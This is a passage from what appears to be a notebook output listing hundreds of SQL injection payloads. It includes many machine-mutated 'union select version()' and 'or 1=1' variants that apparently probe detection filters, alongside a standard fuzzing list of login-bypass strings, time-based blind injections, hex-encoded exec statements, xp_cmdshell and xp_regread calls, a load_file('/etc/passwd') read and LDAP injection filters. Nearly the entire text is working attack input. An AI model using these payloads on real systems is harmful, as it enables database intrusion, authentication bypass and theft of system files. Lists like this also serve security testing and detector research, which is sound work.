       " ' select * from users where id=1 or 1#\". union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\". union select \\'a\\',version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\". union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \".#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \".[\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"._\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or @#\".=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\".=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \".%\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \".@\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \".{\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"1(\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"1)\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"1,\" or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \"1;\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"1]\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"1 union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"1 union select \\'a\\',version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"1 union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \"1#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"1[\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"1_\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"1&\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"1{\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=\\'1\\' or \"\"<@ union select 1,version() -- 1\\'\\n',\n",
       " '&1c',\n",
       " '(s',\n",
       " ')s',\n",
       " ',s',\n",
       " '.s',\n",
       " '1s',\n",
       " ';s',\n",
       " '?s',\n",
       " 'UE1',\n",
       " 'UEf',\n",
       " 'UEs',\n",
       " 'UEv',\n",
       " 'c',\n",
       " 'n',\n",
       " 'ns',\n",
       " 'os',\n",
       " 's',\n",
       " 'v',\n",
       " '{s',\n",
       " ' select * from users where id=1 or 1#\"; or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \";(\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \";)\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \";,\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \";.\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \";1\" or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \";]\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"; union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"; union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"; union select \\'a\\',version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"; union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \";#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \";[\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \";_\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or @#\";=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\";=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \";&\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=\\'1\\' union select \";\"_,version() -- 1\\'\\n',\n",
       " ' select * from users where id=1 or \";@\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \";{\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"? or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"?(\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"])\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"?,\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=\\'1\\' union select $[\"],@@VERSION -- 1\\'\\n',\n",
       " ' select * from users where id=1 or \"].\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"]1\" or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \"?;\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"??\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"? union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"? union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"? union select \\'a\\',version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"? union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \"?#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"?[\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"?_\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"?=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"?=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \"?%\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=\\'1\\' union select \"?\"_,version() -- 1\\'\\n',\n",
       " ' select * from users where id=1 or \"?@\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"]{\" or 1=1 -- 1\\n',\n",
       " \" select * from users where id='1' union select ||/1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' union select (\\\\),@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select (\\\\.),@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select (1),banner from v$version where rownum=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' union select \\\\,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select \\\\.,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select \\\\.#,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select \\\\.%1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select 1,banner from v$version where rownum=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' union select 1a,banner from v$version where rownum=1 -- 1'\\n\",\n",
       " ' select * from users where id=\\'1\\' union select 1\"!\",banner from v$version where rownum=1 -- 1\\'\\n',\n",
       " \" select * from users where id='1' union select \\\\#,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select $ .,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select $ _,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select $*$,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select +\\\\,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select +\\\\.,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select !<1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' union select +\\\\#,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' union select !<@,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' union select @ 1,version() --  1'\\n\",\n",
       " \" select * from users where id='1'   union select null,banner from v$version where rownum=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' union select @ @1,version() --  1'\\n\",\n",
       " ' select * from users where id=1 or \"\\\\#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"$(\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"_)\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=\\'1\\' union select \"[\"_,version() -- 1\\'\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \"_;\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"$?\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"$ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"$ union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"$ union select \\'a\\',version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"$ union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \"$#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"$[\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"$_\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"$&\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"$@\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"_{\" or 1=1 -- 1\\n',\n",
       " \" select * from users where id='1' *(\\\\) or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' + (\\\\) union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' + (\\\\.) union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' *(1) union select 1,banner from v$version where rownum=1 -- 1'\\n\",\n",
       " ' select * from users where id=1 or \"&(\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"&)\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"%,\" or 1=1 -- 1\\n',\n",
       " \" select * from users where id='1'<@.. or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1'<@.. union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' <@.$ or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' <@._ union select 1,version() -- 1'\\n\",\n",
       " ' select * from users where id=1 or \"%.\" or 1=1 -- 1\\n',\n",
       " \" select * from users where id='1' + 1||1 union select 1,banner from v$version where rownum=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' *1 union select 1,banner from v$version where rownum=1 -- 1'\\n\",\n",
       " ' select * from users where id=1 or \"%1\" or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \"%;\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"%?\" or 1=1 -- 1\\n',\n",
       " \" select * from users where id='1' + @<@# union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' *$ . or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' + $ . union select 1,@@VERSION -- 1'\\n\",\n",
       " \" select * from users where id='1' *$ 1 or 1=1 -- 1'\\n\",\n",
       " ' select * from users where id=1 or \"%[\" or 1=1 -- 1\\n',\n",
       " \" select * from users where id='1' <@$_ or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' <@$_ union select 1,version() -- 1'\\n\",\n",
       " ' select * from users where id=1 or \"%_\" or 1=1 -- 1\\n',\n",
       " \" select * from users where id='1' + $+%\\\\ or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' <@&1 or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' <@&1 union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' <@<@ union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' + $+%$ or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' + $+*$ union select 1,@@VERSION -- 1'\\n\",\n",
       " ' select * from users where id=1 or \"%&\" or 1=1 -- 1\\n',\n",
       " \" select * from users where id='1' <@&@ or 1=1 -- 1'\\n\",\n",
       " \" select * from users where id='1' %!<@ union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1'<@$$ union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' + @(1) union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' + @ 1 union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' + @ 1! union select 1,version() -- 1'\\n\",\n",
       " \" select * from users where id='1' + @ @1 union select 1,version() -- 1'\\n\",\n",
       " ' select * from users where id=1 or \"%{\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"@(\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"@)\" or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \"@;\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"@?\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"@ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"@ union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"@ union select \\'a\\',version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"@ union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \"@#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"@%\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"{(\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"{)\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"{,\"=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"{.\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"{1\"=1 or 1=1 -- 1\\n',\n",
       " 's',\n",
       " ' select * from users where id=1 or \"{;\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"{?\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"{ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"{ union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"{ union select \\'a\\',version() -- 1\\n',\n",
       " ' select * from users where id=1 or 1#\"{ union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \"{#\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or @#\"{=1 or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or @#\"{=1 union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 or \"{%\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"{@\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 or \"{{\" or 1=1 -- 1\\n',\n",
       " ' select * from users where id=1 + @`\\\\` union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 + @<1# union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 + @<@. union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 -@<@ union select 1,version() -- 1\\n',\n",
       " ' select * from users where id=1 -@<@ union select version(),version() -- 1\\n',\n",
       " ' select * from users where id=1 -@<@ union select null,version() -- 1\\n',\n",
       " ' select * from users where id=1 + @<@# union select null,version() -- 1\\n',\n",
       " \"'-'\\n\",\n",
       " \"' '\\n\",\n",
       " \"'&'\\n\",\n",
       " \"'^'\\n\",\n",
       " \"'*'\\n\",\n",
       " \"' or ''-'\\n\",\n",
       " \"' or '' '\\n\",\n",
       " \"' or ''&'\\n\",\n",
       " \"' or ''^'\\n\",\n",
       " \"' or ''*'\\n\",\n",
       " '\"-\"\\n',\n",
       " '\" \"\\n',\n",
       " '\"&\"\\n',\n",
       " '\"^\"\\n',\n",
       " '\"*\"\\n',\n",
       " '\" or \"\"-\"\\n',\n",
       " '\" or \"\" \"\\n',\n",
       " '\" or \"\"&\"\\n',\n",
       " '\" or \"\"^\"\\n',\n",
       " '\" or \"\"*\"\\n',\n",
       " 'or true--\\n',\n",
       " '\" or true--\\n',\n",
       " \"' or true--\\n\",\n",
       " '\") or true--\\n',\n",
       " \"') or true--\\n\",\n",
       " \"' or 'x'='x\\n\",\n",
       " \"') or ('x')=('x\\n\",\n",
       " \"')) or (('x'))=(('x\\n\",\n",
       " '\" or \"x\"=\"x\\n',\n",
       " '\") or (\"x\")=(\"x\\n',\n",
       " '\")) or ((\"x\"))=((\"x\\n',\n",
       " 'or 1=1\\n',\n",
       " 'or 1=1-- \\n',\n",
       " 'or 1=1#\\n',\n",
       " 'or 1=1/*\\n',\n",
       " \"admin' --\\n\",\n",
       " \"admin' #\\n\",\n",
       " \"admin'/*\\n\",\n",
       " \"admin' or '1'='1\\n\",\n",
       " \"admin' or '1'='1'--\\n\",\n",
       " \"admin' or '1'='1'#\\n\",\n",
       " \"admin' or '1'='1'/*\\n\",\n",
       " \"admin'or 1=1 or ''='\\n\",\n",
       " \"admin' or 1=1\\n\",\n",
       " \"admin' or 1=1--\\n\",\n",
       " \"admin' or 1=1#\\n\",\n",
       " \"admin' or 1=1/*\\n\",\n",
       " \"admin') or ('1'='1\\n\",\n",
       " \"admin') or ('1'='1'--\\n\",\n",
       " \"admin') or ('1'='1'#\\n\",\n",
       " \"admin') or ('1'='1'/*\\n\",\n",
       " \"admin') or '1'='1\\n\",\n",
       " \"admin') or '1'='1'--\\n\",\n",
       " \"admin') or '1'='1'#\\n\",\n",
       " \"admin') or '1'='1'/*\\n\",\n",
       " \"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\\n\",\n",
       " 'admin\" --\\n',\n",
       " 'admin\" #\\n',\n",
       " 'admin\"/*\\n',\n",
       " 'admin\" or \"1\"=\"1\\n',\n",
       " 'admin\" or \"1\"=\"1\"--\\n',\n",
       " 'admin\" or \"1\"=\"1\"#\\n',\n",
       " 'admin\" or \"1\"=\"1\"/*\\n',\n",
       " 'admin\"or 1=1 or \"\"=\"\\n',\n",
       " 'admin\" or 1=1\\n',\n",
       " 'admin\" or 1=1--\\n',\n",
       " 'admin\" or 1=1#\\n',\n",
       " 'admin\" or 1=1/*\\n',\n",
       " 'admin\") or (\"1\"=\"1\\n',\n",
       " 'admin\") or (\"1\"=\"1\"--\\n',\n",
       " 'admin\") or (\"1\"=\"1\"#\\n',\n",
       " 'admin\") or (\"1\"=\"1\"/*\\n',\n",
       " 'admin\") or \"1\"=\"1\\n',\n",
       " 'admin\") or \"1\"=\"1\"--\\n',\n",
       " 'admin\") or \"1\"=\"1\"#\\n',\n",
       " 'admin\") or \"1\"=\"1\"/*\\n',\n",
       " '1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\\n',\n",
       " \"'sqlvuln\\n\",\n",
       " \"'+sqlvuln\\n\",\n",
       " 'sqlvuln;\\n',\n",
       " '(sqlvuln)\\n',\n",
       " \"a' or 1=1--\\n\",\n",
       " '\"a\"\" or 1=1--\"\\n',\n",
       " ' or a = a\\n',\n",
       " \"a' or 'a' = 'a\\n\",\n",
       " '1 or 1=1\\n',\n",
       " \"a' waitfor delay '0:0:10'--\\n\",\n",
       " \"1 waitfor delay '0:0:10'--\\n\",\n",
       " 'declare @q nvarchar (4000) select @q =\\n',\n",
       " '0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A\\n',\n",
       " '0\\n',\n",
       " '031003000270000\\n',\n",
       " 'declare @s varchar(22) select @s =\\n',\n",
       " '0x77616974666F722064656C61792027303A303A31302700 exec(@s)\\n',\n",
       " '0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)\\n',\n",
       " 'declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e\\n',\n",
       " 'exec(@s)\\n',\n",
       " \"a'\\n\",\n",
       " '?\\n',\n",
       " \"' or 1=1\\n\",\n",
       " '‘ or 1=1 --\\n',\n",
       " \"x' AND userid IS NULL; --\\n\",\n",
       " \"x' AND email IS NULL; --\\n\",\n",
       " \"anything' OR 'x'='x\\n\",\n",
       " \"x' AND 1=(SELECT COUNT(*) FROM tabname); --\\n\",\n",
       " \"x' AND members.email IS NULL; --\\n\",\n",
       " \"x' OR full_name LIKE '%Bob%\\n\",\n",
       " '23 OR 1=1\\n',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\\n\",\n",
       " \"'\\n\",\n",
       " \"'%20or%20''='\\n\",\n",
       " \"'%20or%20'x'='x\\n\",\n",
       " '%20or%20x=x\\n',\n",
       " \"')%20or%20('x'='x\\n\",\n",
       " '0 or 1=1\\n',\n",
       " \"' or 0=0 --\\n\",\n",
       " '\" or 0=0 --\\n',\n",
       " 'or 0=0 --\\n',\n",
       " \"' or 0=0 #\\n\",\n",
       " ' or 0=0 #\"\\n',\n",
       " 'or 0=0 #\\n',\n",
       " \"' or 1=1--\\n\",\n",
       " '\" or 1=1--\\n',\n",
       " \"' or '1'='1'--\\n\",\n",
       " \"' or 1 --'\\n\",\n",
       " 'or 1=1--\\n',\n",
       " 'or%201=1\\n',\n",
       " 'or%201=1 --\\n',\n",
       " \"' or 1=1 or ''='\\n\",\n",
       " ' or 1=1 or \"\"=\\n',\n",
       " \"' or a=a--\\n\",\n",
       " ' or a=a\\n',\n",
       " \"') or ('a'='a\\n\",\n",
       " ') or (a=a\\n',\n",
       " 'hi or a=a\\n',\n",
       " 'hi or 1=1 --\"\\n',\n",
       " \"hi' or 1=1 --\\n\",\n",
       " \"hi' or 'a'='a\\n\",\n",
       " \"hi') or ('a'='a\\n\",\n",
       " '\"hi\"\") or (\"\"a\"\"=\"\"a\"\\n',\n",
       " \"'hi' or 'x'='x';\\n\",\n",
       " '@variable\\n',\n",
       " ',@variable\\n',\n",
       " 'PRINT\\n',\n",
       " 'PRINT @@variable\\n',\n",
       " 'select\\n',\n",
       " 'insert\\n',\n",
       " 'as\\n',\n",
       " 'or\\n',\n",
       " 'procedure\\n',\n",
       " 'limit\\n',\n",
       " 'order by\\n',\n",
       " 'asc\\n',\n",
       " 'desc\\n',\n",
       " 'delete\\n',\n",
       " 'update\\n',\n",
       " 'distinct\\n',\n",
       " 'having\\n',\n",
       " 'truncate\\n',\n",
       " 'replace\\n',\n",
       " 'like\\n',\n",
       " 'handler\\n',\n",
       " 'bfilename\\n',\n",
       " \"' or username like '%\\n\",\n",
       " \"' or uname like '%\\n\",\n",
       " \"' or userid like '%\\n\",\n",
       " \"' or uid like '%\\n\",\n",
       " \"' or user like '%\\n\",\n",
       " 'exec xp\\n',\n",
       " 'exec sp\\n',\n",
       " \"'; exec master..xp_cmdshell\\n\",\n",
       " \"'; exec xp_regread\\n\",\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.google.com'--\\n\",\n",
       " '--sp_password\\n',\n",
       " '\\\\x27UNION SELECT\\n',\n",
       " \"' UNION SELECT\\n\",\n",
       " \"' UNION ALL SELECT\\n\",\n",
       " \"' or (EXISTS)\\n\",\n",
       " \"' (select top 1\\n\",\n",
       " \"'||UTL_HTTP.REQUEST\\n\",\n",
       " '1;SELECT%20*\\n',\n",
       " 'to_timestamp_tz\\n',\n",
       " 'tz_offset\\n',\n",
       " '<>\"\\'%;)(&+\\n',\n",
       " \"'%20or%201=1\\n\",\n",
       " '%27%20or%201=1\\n',\n",
       " '%20$(sleep%2050)\\n',\n",
       " \"%20'sleep%2050'\\n\",\n",
       " 'char%4039%41%2b%40SELECT\\n',\n",
       " '&apos;%20OR\\n',\n",
       " \"'sqlattempt1\\n\",\n",
       " '(sqlattempt2)\\n',\n",
       " '|\\n',\n",
       " '%7C\\n',\n",
       " '*|\\n',\n",
       " '%2A%7C\\n',\n",
       " '*(|(mail=*))\\n',\n",
       " '%2A%28%7C%28mail%3D%2A%29%29\\n',\n",
       " '*(|(objectclass=*))\\n',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29\\n',\n",
       " '(\\n',\n",
       " '%28\\n',\n",
       " ')\\n',\n",
       " '%29\\n',\n",
       " '&\\n',\n",
       " '%26\\n',\n",
       " '!\\n',\n",
       " '%21\\n',\n",
       " \"' or 1=1 or ''='\\n\",\n",
       " \"' or ''='\\n\",\n",
       " \"x' or 1=1 or 'x'='y\\n\",\n",
       " '/\\n',\n",
       " '//\\n',\n",
       " '//*\\n',\n",
       " '*/*\\n',\n",
       " \"a' or 3=3--\\n\",\n",
       " '\"a\"\" or 3=3--\"\\n',\n",
       " \"' or 3=3\\n\",\n",
       " '‘ or 3=3 --',\n",
       " \")%20or%20('x'='x\\n\",\n",
       " '%20or%201=1\\n',\n",
       " \"; execute immediate 'sel' || 'ect us' || 'er'\\n\",\n",
       " 'benchmark(10000000,MD5(1))#\\n',\n",
       " 'update\\n',\n",
       " '\";waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
       " '1) or pg_sleep(__TIME__)--\\n',\n",
       " '||(elt(-3+5,bin(15),ord(10),hex(char(45))))\\n',\n",
       " '\"hi\"\") or (\"\"a\"\"=\"\"a\"\\n',\n",
       " 'delete\\n',\n",
       " 'like\\n',\n",
       " '\" or sleep(__TIME__)#\\n',\n",
       " 'pg_sleep(__TIME__)--\\n',\n",
       " '*(|(objectclass=*))\\n',\n",
       " 'declare @q nvarchar (200) 0x730065006c00650063 ...\\n',\n",
       " ' or 0=0 #\\n',\n",
       " 'insert\\n',\n",
       " '1) or sleep(__TIME__)#\\n',\n",
       " \") or ('a'='a\\n\",\n",
       " '; exec xp_regread\\n',\n",
       " '*|\\n',\n",
       " '@var select @var as var into temp end --\\n',\n",
       " '1)) or benchmark(10000000,MD5(1))#\\n',\n",
       " 'asc\\n',\n",
       " '(||6)\\n',\n",
       " '\"a\"\" or 3=3--\"\\n',\n",
       " '\" or benchmark(10000000,MD5(1))#\\n',\n",
       " '# from wapiti\\n',\n",
       " ' or 0=0 --\\n',\n",
       " \"1 waitfor delay '0:0:10'--\\n\",\n",
       " \" or 'a'='a\\n\",\n",
       " 'hi or 1=1 --\"\\n',\n",
       " 'or a = a\\n',\n",
       " ' UNION ALL SELECT\\n',\n",
       " \") or sleep(__TIME__)='\\n\",\n",
       " ')) or benchmark(10000000,MD5(1))#\\n',\n",
       " \"hi' or 'a'='a\\n\",\n",
       " '0\\n',\n",
       " '21 %\\n',\n",
       " 'limit\\n',\n",
       " ' or 1=1\\n',\n",
       " ' or 2 > 1\\n',\n",
       " '\")) or benchmark(10000000,MD5(1))#\\n',\n",
       " 'PRINT\\n',\n",
       " \"hi') or ('a'='a\\n\",\n",
       " ' or 3=3\\n',\n",
       " \"));waitfor delay '0:0:__TIME__'--\\n\",\n",
       " \"a' waitfor delay '0:0:10'--\\n\",\n",
       " '1;(load_file(char(47,101,116,99,47,112,97,115, ...\\n',\n",
       " 'or%201=1\\n',\n",
       " '1 or sleep(__TIME__)#\\n',\n",
       " 'or 1=1\\n',\n",
       " ' and 1 in (select var from temp)--\\n',\n",
       " \" or '7659'='7659\\n\",\n",
       " \" or 'text' = n'text'\\n\",\n",
       " ' --\\n',\n",
       " \" or 1=1 or ''='\\n\",\n",
       " 'declare @s varchar (200) select @s = 0x73656c6 ...\\n',\n",
       " 'exec xp\\n',\n",
       " \"; exec master..xp_cmdshell 'ping 172.10.1.255'--\\n\",\n",
       " '3.10E+17\\n',\n",
       " '\" or pg_sleep(__TIME__)--\\n',\n",
       " \"x' AND email IS NULL; --\\n\",\n",
       " '&\\n',\n",
       " \"admin' or '\\n\",\n",
       " \" or 'unusual' = 'unusual'\\n\",\n",
       " '//\\n',\n",
       " 'truncate\\n',\n",
       " '1) or benchmark(10000000,MD5(1))#\\n',\n",
       " '\\\\x27UNION SELECT\\n',\n",
       " 'declare @s varchar(200) select @s = 0x77616974 ...\\n',\n",
       " 'tz_offset\\n',\n",
       " 'sqlvuln\\n',\n",
       " '\"));waitfor delay \\'0:0:__TIME__\\'--\\n',\n",
       " '||6\\n',\n",
       " 'or%201=1 --\\n',\n",
       " '%2A%28%7C%28objectclass%3D%2A%29%29\\n',\n",
       " 'or a=a\\n',\n",
       " ') union select * from information_schema.tables;\\n',\n",
       " 'PRINT @@variable\\n',\n",
       " 'or isNULL(1/0) /*\\n',\n",
       " '26 %\\n',\n",
       " '\" or \"a\"=\"a\\n',\n",
       " '(sqlvuln)\\n',\n",
       " \"x' AND members.email IS NULL; --\\n\",\n",
       " ' or 1=1--\\n',\n",
       " ' and 1=( if((load_file(char(110,46,101,120,11 ...\\n',\n",
       " '0x770061006900740066006F0072002000640065006C00 ...\\n',\n",
       " \"%20'sleep%2050'\\n\",\n",
       " 'as\\n',\n",
       " '1)) or pg_sleep(__TIME__)--\\n',\n",
       " '/**/or/**/1/**/=/**/1\\n',\n",
       " ' union all select @@version--\\n',\n",
       " ',@variable\\n',\n",
       " '(sqlattempt2)\\n',\n",
       " ' or (EXISTS)\\n',\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.googl ...\\n\",\n",
       " '%20$(sleep%2050)\\n',\n",
       " '1 or benchmark(10000000,MD5(1))#\\n',\n",
       " \"%20or%20''='\\n\",\n",
       " '||UTL_HTTP.REQUEST\\n',\n",
       " ' or pg_sleep(__TIME__)--\\n',\n",
       " \"hi' or 'x'='x';\\n\",\n",
       " '\") or sleep(__TIME__)=\"\\n',\n",
       " \" or 'whatever' in ('whatever')\\n\",\n",
       " \"; begin declare @var varchar(8000) set @var=' ...\\n\",\n",
       " \" union select 1,load_file('/etc/passwd'),1,1,1;\\n\",\n",
       " '0x77616974666F722064656C61792027303A303A313027 ...\\n',\n",
       " 'exec(@s)\\n',\n",
       " ') or pg_sleep(__TIME__)--\\n',\n",
       " ' union select\\n',\n",
       " ' or sleep(__TIME__)#\\n',\n",
       " ' select * from information_schema.tables--\\n',\n",
       " \"a' or 1=1--\\n\",\n",
       " \"a' or 'a' = 'a\\n\",\n",
       " 'declare @s varchar(22) select @s =\\n',\n",
       " ' or 2 between 1 and 3\\n',\n",
       " ' or a=a--\\n',\n",
       " \" or '1'='1\\n\",\n",
       " '|\\n',\n",
       " \" or sleep(__TIME__)='\\n\",\n",
       " \" or 1 --'\\n\",\n",
       " 'or 0=0 #\"\\n',\n",
       " 'having\\n',\n",
       " \"a'\\n\",\n",
       " '\" or isNULL(1/0) /*\\n',\n",
       " 'declare @s varchar (8000) select @s = 0x73656c ...\\n',\n",
